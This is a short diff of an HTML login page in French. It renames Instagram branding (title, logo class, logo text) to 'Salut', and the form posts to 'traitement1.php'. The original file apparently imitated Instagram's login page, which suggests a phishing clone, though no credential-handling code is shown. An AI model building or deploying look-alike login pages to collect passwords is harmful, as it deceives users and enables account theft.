@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram - Connexion</title>
+    <title>salut - Connexion</title>
     <style>
      
         body {
@@ -28,7 +28,7 @@
         }
 
        
-        .instagram-logo {
+        .salut-logo {
             font-family: 'Billabong', cursive;
             font-size: 44px;
             margin: 10px 0 30px;
@@ -104,7 +104,7 @@
 
 <body>
     <div class="form-container">
-        <div class="instagram-logo">Instagram</div>
+        <div class="salut-logo">Salut</div>
         
         <form action="traitement1.php" method="POST">
             <div class="form-group">
